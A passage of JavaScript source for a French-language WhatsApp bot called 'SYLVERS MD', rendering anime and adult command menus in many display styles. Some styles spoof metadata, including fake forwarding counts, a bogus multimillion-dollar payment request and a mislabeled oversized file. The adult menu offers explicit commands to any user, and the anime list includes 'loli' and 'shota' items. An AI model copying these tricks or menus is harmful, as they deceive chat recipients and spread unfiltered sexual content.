                	Kev.sendMessage(m.chat, {
      video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
      gifPlayback: true,
      caption: kevmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/2800c0d2e02e3afcb4033.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 's9') {
                	Kev.sendMessage(m.chat, {
video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
caption: kevmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: global.xchannel.jid,
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://telegra.ph/file/2800c0d2e02e3afcb4033.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 's10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: kevmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Tout-Menu🧾","id":"${prefix}tout-menu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 's11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: kevmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Tout-Menu🧾","id":"${prefix}tout-menu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await Kev.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 's12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: kevmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU🧾",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"TOUT-MENU",
"title":"cliquez pour selectionner",
"description":"Afficher la liste de toutes les commandes",
"id":"${prefix}tout-menu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'menu-anime': {
let kevmenu_oh = `
╭─✣「 *SYLVERS MD* 」✣──╮
│➠ *Hey 🍁*
│➠ *${m.pushName}* 
│➠ *${Kevinoutimewisher}* 
╰──────✣ ${readmore}
╭──✣「 *GUIDE* 」✣────╮
│➠ *🅟 = pour le proprio * 
│➠ *🅡 = Pour les randoms*
│➠ *🅑 =pour les boss*
╰─────────────────╯
╭──✣「 *Anime* 」✣─────╮
│${setv} ╭───────────╮
│${setv} │${prefix}stickhandhold 🅡
│${setv} │${prefix}stickshinobu 🅡
│${setv} │${prefix}stickcuddle 🅡
│${setv} │${prefix}stickhighfive 🅡
│${setv} │${prefix}stickdance 🅡
│${setv} │${prefix}stickcringe 🅡
│${setv} │${prefix}stickhappy 🅡
│${setv} │${prefix}stickglomp 🅡
│${setv} │${prefix}sticksmug 🅡
│${setv} │${prefix}stickblush 🅡
│${setv} │${prefix}stickawoo 🅡
│${setv} │${prefix}stickwave 🅡
│${setv} │${prefix}sticksmile 🅡
│${setv} │${prefix}stickslap 🅡
│${setv} │${prefix}stickpoke 🅡
│${setv} │${prefix}stickwink 🅡
│${setv} │${prefix}stickbonk 🅡
│${setv} │${prefix}stickbully 🅡
│${setv} │${prefix}stickyeet 🅡
│${setv} │${prefix}stickbike 🅡
│${setv} │${prefix}stickkiss 🅡
│${setv} │${prefix}sticklick 🅡
│${setv} │${prefix}stickpat 🅡
│${setv} │${prefix}stickhug 🅡
│${setv} │${prefix}stickkill 🅡
│${setv} │${prefix}stickcry 🅡
│${setv} │${prefix}stickspank 🅡
│${setv} │${prefix}sticktickle 🅡
│${setv} │${prefix}traceanime 🅡
│${setv} │${prefix}akira 🅡
│${setv} │${prefix}akiyama 🅡
│${setv} │${prefix}ana 🅡
│${setv} │${prefix}asuna 🅡
│${setv} │${prefix}ayuzawa 🅡
│${setv} │${prefix}boruto 🅡
│${setv} │${prefix}chiho 🅡
│${setv} │${prefix}chitoge 🅡
│${setv} │${prefix}cosplayloli 🅡
│${setv} │${prefix}cosplaysagiri 🅡
│${setv} │${prefix}deidara 🅡
│${setv} │${prefix}doraemon 🅡
│${setv} │${prefix}elaina 🅡
│${setv} │${prefix}emilia 🅡
│${setv} │${prefix}erza 🅡
│${setv} │${prefix}gremory 🅡
│${setv} │${prefix}hestia 🅡
│${setv} │${prefix}husbu 🅡
│${setv} │${prefix}inori 🅡
│${setv} │${prefix}isuzu 🅡
│${setv} │${prefix}itachi 🅡
│${setv} │${prefix}itori 🅡
│${setv} │${prefix}kaga 🅡
│${setv} │${prefix}kagura 🅡
│${setv} │${prefix}kakasih 🅡
│${setv} │${prefix}kaori 🅡
│${setv} │${prefix}keneki 🅡
│${setv} │${prefix}kotori 🅡
│${setv} │${prefix}kurumi 🅡
│${setv} │${prefix}loli 🅡
│${setv} │${prefix}loli2 🅡
│${setv} │${prefix}madara 🅡
│${setv} │${prefix}megumin 🅡
│${setv} │${prefix}mikasa 🅡
│${setv} │${prefix}mikey 🅡
│${setv} │${prefix}miku 🅡
│${setv} │${prefix}minato 🅡
│${setv} │${prefix}naruto 🅡
│${setv} │${prefix}neko 🅡
│${setv} │${prefix}nekonime 🅡
│${setv} │${prefix}nezuko 🅡
│${setv} │${prefix}onepiece 🅡
│${setv} │${prefix}pokemon 🅡
│${setv} │${prefix}randomnime 🅡
│${setv} │${prefix}randomnime2 🅡
│${setv} │${prefix}rize 🅡
│${setv} │${prefix}sagiri 🅡
│${setv} │${prefix}sakura 🅡
│${setv} │${prefix}sasuke 🅡
│${setv} │${prefix}shina 🅡
│${setv} │${prefix}shinka 🅡
│${setv} │${prefix}shinomiya 🅡
│${setv} │${prefix}shizuka 🅡
│${setv} │${prefix}shota 🅡
│${setv} │${prefix}tejina 🅡
│${setv} │${prefix}toukachan 🅡
│${setv} │${prefix}tsunade 🅡
│${setv} │${prefix}waifu 🅡
│${setv} │${prefix}waifu2 🅡
│${setv} │${prefix}animewall 🅡
│${setv} │${prefix}yotsuba 🅡
│${setv} │${prefix}yuki 🅡
│${setv} │${prefix}yulibocil 🅡
│${setv} │${prefix}yumeko 🅡
│${setv} │${prefix}8ball 🅡
│${setv} │${prefix}animeawoo 🅡
│${setv} │${prefix}animemegumin 🅡
│${setv} │${prefix}animeshinobu 🅡
│${setv} │${prefix}animehandhold 🅡
│${setv} │${prefix}animehighfive 🅡
│${setv} │${prefix}animecringe 🅡
│${setv} │${prefix}animedance 🅡
│${setv} │${prefix}animehappy 🅡
│${setv} │${prefix}animeglomp 🅡
│${setv} │${prefix}animeblush 🅡
│${setv} │${prefix}animesmug 🅡
│${setv} │${prefix}animewave 🅡
│${setv} │${prefix}animesmille 🅡
│${setv} │${prefix}animepoke 🅡
│${setv} │${prefix}animewink 🅡
│${setv} │${prefix}animebonk 🅡
│${setv} │${prefix}animebully 🅡
│${setv} │${prefix}animeyeet 🅡
│${setv} │${prefix}animebite 🅡
│${setv} │${prefix}animelick 🅡
│${setv} │${prefix}animekill 🅡
│${setv} │${prefix}animecry 🅡
│${setv} │${prefix}animewlp 🅡
│${setv} │${prefix}animekiss 🅡
│${setv} │${prefix}animehug 🅡
│${setv} │${prefix}animeneko 🅡
│${setv} │${prefix}animepat 🅡
│${setv} │${prefix}animeslap 🅡
│${setv} │${prefix}animecuddle 🅡
│${setv} │${prefix}animewaifu 🅡
│${setv} │${prefix}animenom 🅡
│${setv} │${prefix}animefoxgirl 🅡
│${setv} │${prefix}animegecg 🅡
│${setv} │${prefix}animetickle 🅡
│${setv} │${prefix}animefeed 🅡
│${setv} │${prefix}animeavatar 🅡
│${setv} │${prefix}anime 🅡
│${setv} │${prefix}avatar 🅡
│${setv} │${prefix}shinobu 🅡
│${setv} │${prefix}fox_girl 🅡
│${setv} │${prefix}gecg 🅡
│${setv} ╰───────────╯
╰──────────────────╯`
if (typemenu === 's1') {
                    Kev.sendMessage(m.chat, {
                        image: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                        caption: kevmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's2') {
                    Kev.sendMessage(m.chat, {
                        text: kevmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 's3') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
                        caption: kevmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's4') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
                        caption: kevmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's5') {
                    Kev.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: kevmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 's6') {
                    Kev.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: kevmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 's7') {
                    Kev.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: kevmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 's8') {
                	Kev.sendMessage(m.chat, {
      video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
      gifPlayback: true,
      caption: kevmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/2800c0d2e02e3afcb4033.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 's9') {
                	Kev.sendMessage(m.chat, {
video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
caption: kevmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: global.xchannel.jid,
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://telegra.ph/file/2800c0d2e02e3afcb4033.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 's10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: kevmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Tout-Menu🧾","id":"${prefix}tout-menu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 's11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: kevmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Tout-Menu🧾","id":"${prefix}tout-menu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await Kev.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 's12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: kevmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU🧾",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"TOUT-MENU",
"title":"cliquez pour selectionner",
"description":"Afficher la liste de toutes les commandes",
"id":"${prefix}tout-menu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'menu-18': {
let kevmenu_oh = `
╭─✣「 *SYLVERS MD* 」✣─╮
│➠ *Hey 🍁*
│➠ *${m.pushName}* 
│➠ *${Kevinoutimewisher}* 
╰──────✣ ${readmore}
╭──✣「 *GUIDE* 」✣───╮
│➠ *🅟 = pour le proprio * 
│➠ *🅡 = Pour les randoms*
│➠ *🅑 =pour les boss*
╰────────────────╯
╭──✣「 *Anime -18* 」✣─╮
│${setv} ╭──────────╮
│${setv} │${prefix}hentai 🅡
│${setv} │${prefix}gifblowjob 🅡
│${setv} │${prefix}hentaivid 🅡
│${setv} │${prefix}hneko 🅡
│${setv} │${prefix}nwaifu 🅡
│${setv} │${prefix}animespank 🅡
│${setv} │${prefix}trap 🅡
│${setv} │${prefix}blowjob 🅡
│${setv} │${prefix}cuckold 🅡
│${setv} │${prefix}milf 🅡
│${setv} │${prefix}eba 🅡
│${setv} │${prefix}pussy 🅡
│${setv} │${prefix}yuri 🅡
│${setv} │${prefix}zettai 🅡
│${setv} ╰──────────╯
╰─────────────────╯`
if (typemenu === 's1') {
                    Kev.sendMessage(m.chat, {
                        image: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                        caption: kevmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's2') {
                    Kev.sendMessage(m.chat, {
                        text: kevmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 's3') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
                        caption: kevmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's4') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
                        caption: kevmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's5') {
                    Kev.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: kevmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 's6') {
                    Kev.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: kevmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 's7') {
                    Kev.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: kevmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 's8') {
                	Kev.sendMessage(m.chat, {
      video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
      gifPlayback: true,
      caption: kevmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/2800c0d2e02e3afcb4033.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 's9') {
                	Kev.sendMessage(m.chat, {
video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
caption: kevmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: global.xchannel.jid,
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://telegra.ph/file/2800c0d2e02e3afcb4033.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 's10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: kevmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Tout-Menu🧾","id":"${prefix}tout-menu"}`
   },
              {
                "name": "quick_reply",
